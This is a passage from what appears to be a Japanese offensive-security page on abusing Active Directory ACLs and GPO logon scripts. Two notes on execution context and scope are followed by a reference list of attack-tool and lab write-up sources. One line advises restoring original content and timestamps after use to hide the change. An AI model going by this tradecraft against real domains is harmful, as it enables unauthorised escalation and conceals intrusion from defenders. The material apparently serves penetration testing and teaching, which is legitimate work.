- 実行は logging user のトークン（SYSTEM ではない）で行われます。適用対象のスクリプトに対する GPO リンク（OU、サイト、ドメイン）がスコープです。
- 使用後は元の内容とタイムスタンプを復元してクリーンアップしてください。


## References

- [1] [Active Directory ACL/ACE の悪用](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特権アカウントとトークン特権](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL 攻撃パスの更新](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory の ACL を使った権限昇格](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory の権限と特権アカウントのスキャン](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux からの AD 属性/UAC 操作](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（グループメンバーシップ）](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL の悪用、KeePassXC Argon2 のクラッキング、DPAPI の復号による DC admin への昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: コード実行と NTLM Relay を目的とした GPO UNC パスの乗っ取り](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relay などを利用した Active Directory GPO の悪用](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory における非表示の Organizational Unit の ACL 攻撃ベクトルの悪用](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [ネットワーク上で正規の Active Directory サービスをシミュレートする: GPO の悪用事例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU を介した移動と継承 ACL の悪用](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
